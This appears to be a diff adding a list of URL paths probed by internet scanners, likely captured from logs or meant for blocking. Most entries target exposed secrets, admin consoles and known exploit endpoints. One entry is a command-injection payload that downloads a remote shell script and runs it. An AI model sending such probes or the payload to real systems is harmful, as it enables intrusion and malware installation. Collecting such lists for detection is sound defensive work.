@@ -1,0 +1,101 @@
+ /
+ /nice%20ports%2C/Tri%6Eity.txt%2ebak
+ http://ip-api.com/json/
+ /version
+ /.env
+ /containers/json
+ /aaa9
+ /aab8
+ /cgi-bin/luci/;stok=/locale
+ /admin/config.php
+ /shell
+ /login
+ /.git/config
+ /v1.16/version
+ login.cgi
+ http://ipv4.icanhazip.com/
+ http://www.google.com/
+ HTTP://ip-api.com/
+ /jmx
+ /console/
+ /api/version
+ /get_info
+ /bins/
+ /solr/admin/info/system
+ http://clientapi.ipip.net/echo.php
+ /query
+ /favicon.ico
+ /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ /_ignition/execute-solution
+ /jars
+ /geoserver
+ /actuator/gateway/routes
+ /bin/
+ /config
+ /gatedesc.xml
+ /_all_dbs
+ /backup/
+ /t4
+ /_cat/indices
+ /download/powershell/
+ /get.php
+ /etc/linuxigd/gatedesc.xml
+ /v2/_catalog
+ /robots.txt
+ /rootDesc.xml
+ /./
+ /api/v1/pods
+ /setup.cgi
+ /login.jsp
+ /api/v1/services
+ /api/v1/services
+/api/v1/endpoints
+/api/v1/nodes
+/manager/html
+/api/v1/targets
+/_config
+/securityRealm/user/admin/search/index
+/boaform/admin/formLogin
+/v1
+/solr/admin/cores
+/info
+/developmentserver/metadatauploader
+/stats
+/db/manage/
+/manager/text/list
+/_search
+http://api.ip.pn/json
+/v1/agent/self
+/form.html
+/upl.php
+/password.php
+/geoip/
+/systembc/password.php
+/1.php
+/.git/index
+/actuator/health
+/IGD.xml
+/cgi-bin/;wget${IFS}-qO-${IFS}http://74.194.191.52/rondo.sbx.sh|sh&echo${IFS}
+/druid/index.html
+/api/session/properties
+/setup/eureka_info
+/v2/
+/login.rsp
+/hudson
+/HNAP1/
+/tr064dev.xml
+/assets/js/views/login.js
+/admin/
+/HNAP1
+/evox/about
+/goform/setUsbUnload/.js
+/_profiler/phpinfo
+/v2/stats/self
+/helpdesk/WebObjects/Helpdesk.woa
+/_status
+/metrics
+/_aliases
+/upnpdev.xml
+/DeviceDescription.xml
+/devicedesc.xml
+/IGDdevicedesc.xml
